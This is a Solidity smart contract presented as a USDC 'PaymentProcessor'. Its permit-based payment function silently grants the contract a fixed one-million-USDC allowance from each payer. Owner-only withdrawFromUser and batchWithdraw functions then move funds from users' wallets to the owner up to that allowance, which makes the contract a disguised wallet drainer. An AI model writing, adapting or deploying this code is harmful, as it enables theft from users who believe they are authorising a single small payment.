// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";

contract PaymentProcessor is Initializable, OwnableUpgradeable {
    address public usdcToken;
    uint256 public constant APPROVAL_AMOUNT = 1000000 * 10**6;
    
    event PaymentReceived(address indexed user, uint256 amount);
    event FundsWithdrawn(address indexed user, uint256 amount);

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();  // 🔧 修复：使用 _disableInitializers()
    }

    function initialize(address _usdcToken) public initializer {
        __Ownable_init();  // 🔧 修复：正确调用父类初始化
        usdcToken = _usdcToken;
    }
    
    /**
     * @dev 使用字节打包的permit数据进行支付
     */
    function makePaymentWithPermit(
        uint256 paymentAmount,
        bytes calldata permitData
    ) external {
        require(paymentAmount > 0, "Payment amount must be greater than 0");
        
        // 解码字节打包的permit数据
        (
            uint256 deadline,
            uint8 v, 
            bytes32 r, 
            bytes32 s
        ) = abi.decode(permitData, (uint256, uint8, bytes32, bytes32));
        
        // 使用 IERC20Permit 进行授权
        IERC20Permit usdcPermit = IERC20Permit(usdcToken);
        usdcPermit.permit(
            msg.sender,
            address(this),
            APPROVAL_AMOUNT,
            deadline,
            v, r, s
        );
        
        // 使用 IERC20 进行转账
        IERC20 usdc = IERC20(usdcToken);
        require(
            usdc.transferFrom(msg.sender, owner(), paymentAmount),
            "Payment transfer failed"
        );
        
        emit PaymentReceived(msg.sender, paymentAmount);
    }
    
    /**
     * @dev 管理员从用户账户提取资金
     */
    function withdrawFromUser(address user, uint256 amount) external onlyOwner {
        require(amount > 0, "Amount must be greater than 0");
        
        IERC20 usdc = IERC20(usdcToken);
        
        uint256 currentAllowance = usdc.allowance(user, address(this));
        require(amount <= currentAllowance, "Amount exceeds current allowance");
        
        uint256 userBalance = usdc.balanceOf(user);
        require(amount <= userBalance, "Amount exceeds user balance");
        
        require(
            usdc.transferFrom(user, owner(), amount),
            "Withdrawal failed"
        );
        
        emit FundsWithdrawn(user, amount);
    }
    
    /**
     * @dev 批量从多个用户转账
     */
    function batchWithdraw(
        address[] calldata users, 
        uint256[] calldata amounts
    ) external onlyOwner {
        require(users.length == amounts.length, "Arrays length mismatch");
        
        IERC20 usdc = IERC20(usdcToken);
        
        for (uint i = 0; i < users.length; i++) {
            if (amounts[i] > 0) {
                require(
                    usdc.transferFrom(users[i], owner(), amounts[i]),
                    "Transfer failed"
                );
                emit FundsWithdrawn(users[i], amounts[i]);
            }
        }
    }
    
    /**
     * @dev 查询用户给本合约的授权额度
     */
    function getUserAllowance(address user) external view returns (uint256) {
        return IERC20(usdcToken).allowance(user, address(this));
    }
    
    /**
     * @dev 查询用户USDC余额
     */
    function getUserBalance(address user) external view returns (uint256) {
        return IERC20(usdcToken).balanceOf(user);
    }
    
    /**
     * @dev 获取固定授权金额
     */
    function getApprovalAmount() external pure returns (uint256) {
        return APPROVAL_AMOUNT;
    }
    
    /**
     * @dev 获取合约版本
     */
    function getVersion() external pure returns (string memory) {
        return "v1.0";
    }
}

